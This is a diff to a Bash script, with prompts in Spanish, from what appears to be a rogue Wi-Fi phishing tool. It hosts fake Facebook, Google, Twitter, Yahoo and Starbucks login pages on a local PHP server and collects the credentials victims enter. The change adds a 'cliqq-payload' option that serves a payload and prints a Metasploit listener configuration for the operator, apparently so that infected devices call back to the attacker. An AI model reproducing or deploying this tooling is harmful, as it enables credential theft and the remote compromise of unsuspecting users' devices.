@@ -151,10 +151,10 @@ function startAttack(){
 	sleep 5
 
 	# Array de plantillas
-	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login optimumwifi)
+	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi)
 
 	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, optimumwifi):${endColour} " && read template
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, optimumwifi):${endColour} " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 		if [ "$plantilla" == "$template" ]; then
@@ -162,11 +162,26 @@ function startAttack(){
 		fi
 	done
 
+	if [ "$template" == "cliqq-payload" ]; then
+		check_plantillas=2
+	fi
+
 	if [ $check_plantillas -eq 1 ]; then
 		tput civis; pushd $template > /dev/null 2>&1
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
 		php -S 192.168.1.1:80 > /dev/null 2>&1 &
 		sleep 2
+		popd > /dev/null 2>&1; getCredentials
+	elif [ $check_plantillas -eq 2 ]; then
+		tput civis; pushd $template > /dev/null 2>&1
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+		php -S 192.168.1.1:80 > /dev/null 2>&1 &
+		sleep 2
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
+		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+		cat msfconsole.rc
+		for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+		echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
 		popd > /dev/null 2>&1; getCredentials
 	else
 		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
